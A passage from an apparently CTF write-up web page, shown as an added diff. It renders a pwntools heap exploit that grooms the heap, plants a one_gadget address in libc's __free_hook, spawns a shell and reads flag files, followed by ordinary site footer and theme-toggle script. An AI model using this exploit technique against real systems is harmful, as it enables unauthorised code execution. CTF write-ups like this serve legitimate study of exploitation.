+    <span class="n">do_select_file</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">'H'</span><span class="o">*</span><span class="mh">0xc0</span><span class="p">)</span>
+    <span class="n">select_do_change_content</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xc0</span><span class="p">))</span>
+    <span class="n">select_do_change_name</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">'hi'</span><span class="p">)</span>
+    <span class="n">select_do_save_changes</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">select_do_change_content</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x130</span><span class="p">)</span>
+    <span class="n">select_do_back</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'heap groomed'</span><span class="p">)</span>
+    
+    <span class="n">do_create_file</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">'meh'</span><span class="p">)</span>
+    <span class="n">do_select_file</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">'meh'</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">fit</span><span class="p">({</span>
+        <span class="mh">0xd0</span><span class="o">-</span><span class="mi">39</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'/etc/localtime</span><span class="se">\x00</span><span class="s">'</span><span class="p">,</span>
+        <span class="mh">0xf0</span><span class="o">-</span><span class="mi">39</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xf1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+        <span class="mh">0x1e0</span><span class="o">-</span><span class="mi">39</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1b1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+        <span class="mh">0x390</span><span class="o">-</span><span class="mi">39</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xf1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span><span class="p">),</span>
+    <span class="p">},</span> <span class="n">length</span><span class="o">=</span><span class="mh">0x400</span><span class="p">)</span>
+    <span class="n">select_do_change_content</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">select_do_change_name</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">'ho'</span><span class="p">)</span>
+    <span class="n">select_do_change_content</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">'B'</span><span class="o">*</span><span class="p">(</span><span class="mh">0xd0</span><span class="o">-</span><span class="mi">25</span><span class="o">-</span><span class="mi">2</span><span class="o">-</span><span class="mh">0x10</span><span class="p">))</span>
+    <span class="n">select_do_delete</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'planted free_hook'</span><span class="p">)</span>
+
+    <span class="n">do_select_file</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">'README.md'</span><span class="p">)</span>
+    <span class="n">select_do_change_name</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">'W'</span><span class="o">*</span><span class="mh">0xd0</span><span class="p">)</span>
+    <span class="n">select_do_save_changes</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="c1"># select_do_back(l)
+</span>    <span class="c1"># select_do_delete(l)
+</span>    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x10a41c</span> <span class="c1"># 0x4f3d5 0x4f432
+</span>    <span class="n">select_do_change_name</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'enjoy your shell'</span><span class="p">)</span>
+    <span class="c1"># select_do_save_changes(l)
+</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'id;cat f*;cat /home/ctf/f*'</span><span class="p">)</span>
+
+    <span class="n">l</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
